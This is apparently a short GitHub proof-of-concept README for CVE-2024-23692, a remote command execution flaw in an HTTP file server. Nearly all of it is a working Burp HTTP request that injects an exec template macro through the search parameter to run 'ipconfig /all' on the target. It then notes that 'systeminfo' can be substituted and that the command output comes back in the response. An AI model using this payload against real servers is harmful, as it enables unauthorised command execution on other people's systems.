# CVE-2024-23692
BURP POC

```
GET /?n=%0A&cmd=ipconfig+/all&search=%25xxx%25url:%password%}{.exec|{.?cmd.}|timeout=15|out=abc.}{.?n.}{.?n.}RESULT:{.?n.}{.^abc.}===={.?n.} HTTP/1.1

Host: xxxx

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Connection: close

Cookie: HFS_SID_=0.344328237697482

Upgrade-Insecure-Requests: 1
```

=========================================================

![Snipaste_2024-06-11_15-29-24](https://github.com/k3lpi3b4nsh33/CVE-2024-23692/assets/118002757/4963ae98-224e-463e-a504-812c70a68e53)


COMMAND=systeminfo

You can see that the echo message is around 100 lines of RAW Response
